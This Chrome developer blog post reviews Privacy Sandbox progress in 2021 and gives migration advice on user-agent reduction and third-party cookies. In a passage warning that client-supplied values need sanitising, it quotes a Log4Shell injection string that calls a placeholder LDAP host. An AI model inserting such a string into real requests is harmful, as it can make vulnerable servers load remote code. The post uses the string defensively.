---
title: Progress in the Privacy Sandbox (December 2021)
description: >
  Looking back at stats from 2021 and some resolutions for tackling user-agent and cookies in 2022.
layout: 'layouts/blog-post.njk'
date: 2021-12-30
authors:
  - rowan_m
hero: 'image/VWw0b3pM7jdugTkwI6Y81n6f5Yc2/Ut0IykTaEFBuOA5EHqbg.png'
alt: >
  Privacy Sandbox logo
tags:
  - progress-in-the-privacy-sandbox
  - privacy
---

Welcome to the December and end-of-year edition of "**[Progress in the Privacy Sandbox](/tags/progress-in-the-privacy-sandbox/)**" tracking the milestones on the path to phasing out third-party cookies in Chrome and working towards a more private web. Normally we would share an overview of the updates to the **[Privacy Sandbox timeline](https://privacysandbox.com/timeline/)** along with news from across the project, but December has been a quiet month so instead we'll look back at some of the activity over 2021 and provide a few potential resolutions you can make for the new year.


## Chromium development process

For a new web platform feature to land in Chromium (and therefore Chrome) it needs to go through the [project's open development process](https://www.chromium.org/blink/launching-features). In 2021, the Privacy Sandbox team produced:

<table style="font-size: 140%; font-weight: bold;">
<tr><td>🥚</td><td>Intent to Prototype </td><td>20</td></tr>
<tr><td>🧪</td><td>Intent to Experiment</td><td> 8</td></tr>
<tr><td>🚀</td><td>Intent to Ship      </td><td>11</td></tr>
</table>



Source: 

Each milestone is also an invitation for the wider developer ecosystem to contribute.

An **Intent to Prototype** is the first checkpoint and where we invite discussion and early experimentation. This means the proposal will be available on GitHub, meaning **you can ask questions via Issues** or **[join discussions and presentations in standards groups](/docs/privacy-sandbox/cds21-update/#discussion)** such as the W3C and IETF. This is also the point where coding begins, meaning you can **expect the prototype functionality to be made available for developer testing behind a flag**. Initial developer feedback is critical for validating and iterating on the proposal.

An **Intent to Experiment** is an optional step if we would like to request an Origin Trial. This means that **you can [sign up for the Origin Trial](/blog/origin-trials/)** and then **test the feature on your production site**. It's called an experiment because we will have specific aspects of the feature we want to validate in real-world environments. Developers that can **test and share the results of those tests** provide valuable feedback to help iterate and evolve the feature.

An **Intent to Ship** is the final milestone which signals that the feature is now complete and ready to go to production. Once approved, the feature will be merged into an upcoming release and then progress through the canary, beta, and stable channels. It's critical to ensure you **test your sites with the [canary](https://www.google.com/chrome/canary/) and [beta](https://www.google.com/chrome/beta/) versions of Chrome** to catch and report any bugs before the feature reaches stable.


## Proposals

Each Privacy Sandbox proposal has an accompanying GitHub repository with an explainer to summarize the overall functionality, a detailed specification for implementation by browsers, and then contributions from across the web ecosystem in the form of Issues and Pull Requests.

Across 14 Privacy Sandbox repositories, we had:


<table style="font-size: 140%; font-weight: bold;">
  <tr><td rowspan="2">💬</td><td>545</td><td>Issues created</td></tr>
  <tr>                       <td>250</td><td>Issues closed</td></tr>
  <tr><td rowspan="2">🛠️</td><td>261</td><td>Pull Requests created</td></tr>
  <tr>                        <td>223</td><td>Pull Requests merged</td></tr>
</table>


Source: 

The language in explainers and specifications often starts as quite targeted to an audience already familiar with standards and browser development which can be challenging if you're unfamiliar with it. However, the aim of an explainer is to explain! If there are points that are unclear or not covered, **we want you to raise an Issue** so we can improve.


## Resolutions


### User-agent spring cleaning

As we count _down_ to the New Year, we're also counting _up_ to both [Chrome 100](/blog/force-major-version-to-100/) and the incremental [reduction of the user-agent string](/docs/privacy-sandbox/user-agent/). This is a good motivator to revisit any usage of the user-agent string in your code to check if it's affected by either of these changes.



1. To find those areas, search for `navigator.useragent` in your JavaScript code or access to the `User-Agent` header in your server code.
2. Check your parsing of the string for assumptions about a 2 digit version. For example, a regex that specifies `\d\d` or `\d{2}` should be replaced with `\d+`.
3. Check your use of the string for anywhere you rely on: platform (operating system) version, the full Chrome build version, or the mobile device name. These are the values that will be reduced to fixed values in the future. If you need access to these values, you will need to [migrate to User-Agent Client Hints](https://web.dev/migrate-to-ua-ch/).

There is one December update to mention—if you are adopting User-Agent Client Hints then we have sent the **Intent to Ship to [enable delegating hints to other origins in HTML](https://groups.google.com/a/chromium.org/g/blink-dev/c/JQ68cvYuiQU/m/S_33YSqxCwAJ)** via a `&lt;meta>` tag, for example:

```javascript
<meta name="accept-ch" content="sec-ch-width=( https://foo.bar )">`
```

If you're in an enthusiastic spring cleaning mood, you can also consider alternatives to the use of user-agent altogether. If you're using the string to detect mobile devices, then investigate if you can replace this with responsive design. If you're checking the browser name and version for feature support, see if you can use feature detection instead.

It's always worth remembering that the user-agent, like any client provided value, is not guaranteed to be accurate or even provided. The recent [Log4j vulnerability, "Log4shell"](https://nvd.nist.gov/vuln/detail/CVE-2021-44228#vulnCurrentDescriptionTitle) provides an example of this risk. A client that set its user-agent string to include a string like `${jndi:ldap://example.com/file}` may be able to get a site to actively parse that on the server-side. It's critical that you treat user-agent in the same way as any other form of user input—sanitize and validate it before acting on that value.


### Cookie cataloguing

Another traditional new year activity is to make sure you're happy you have a healthy number of cookies with quality ingredients. As we continue moving towards the phase out of third-party cookies, you should make sure you know which of your site's cookies will be affected. 2020 provided a headstart as it became necessary to [mark all cookies for cross-site or third-party use](https://web.dev/samesite-cookies-explained/#samesitenone-must-be-secure) with `SameSite=None`. 

Any cookie where you have set the `SameSite` attribute to `None` will need an update.

There are three possible routes to consider at the moment:



1. If the cookie is only required in a 1:1 relationship with the top-level site, then follow the progress of the **[CHIPS proposal](https://github.com/WICG/CHIPS)** which would mean adding the `Partitioned` attribute to the cookie.
2. If the cookie is used in a cross-site context, but only across sites that you own and operate, then it may be a candidate for **[First-Party Sets](/docs/privacy-sandbox/first-party-sets/)**. This would involve both defining the sites in the set and adding the `SameParty` attribute to the cookie.
3. If the cookie is used to provide some form of shared value across multiple sites, you will need to investigate the wider set of [Privacy Sandbox proposals](/docs/privacy-sandbox/) for an alternative solution that does not rely on cross-site tracking.

If you're feeling especially healthy, then this is also an ideal time to revisit all of your cookie usage as we have a good recipe to improve your first-party cookies too.

{% YouTube id='1g2uQfP1Q3U' %}


## Feedback

As we continue to publish these monthly updates, and progress through the Privacy Sandbox as a whole, we want to make sure that developers receive the information and support that they need. Let us know on [@ChromiumDev Twitter](https://twitter.com/ChromiumDev) if there's anything that we could improve in this series. We'll use your input to continue improving the format.

Check out the **[Privacy Sandbox FAQ](/docs/privacy-sandbox/faq/)**, which we continue to expand based on the issues you submit to the [developer support repo](https://github.com/GoogleChromeLabs/privacy-sandbox-dev-support). If you have any questions around testing or implementation on any of the proposals, come talk to us there.
